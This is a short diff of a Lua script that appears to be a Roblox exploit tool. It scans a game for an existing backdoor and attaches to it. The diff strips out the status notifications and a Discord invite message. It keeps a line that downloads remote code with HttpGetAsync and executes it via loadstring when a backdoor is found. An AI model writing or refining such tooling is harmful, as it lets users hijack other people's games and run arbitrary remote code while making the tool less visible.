@@ -59,8 +59,7 @@ local function runBackdoor(rm)
 end
 
 local function scanGame()
-    notify("Scanning for a backdoor.")
-    if harked() then
+      if harked() then
         loadstring(game:HttpGetAsync(alternativeSS.harked))()
         return
     end
@@ -90,12 +89,10 @@ local function scanGame()
 end
 
 local function Main()
-    notify("Make sure to join our Discord!\nCode: "..invCode)
 
     scanGame()
     
     if not attached(2) then
-        notify("Unable to find backdoor.\nGame not backdoored?")
     end
 end
 
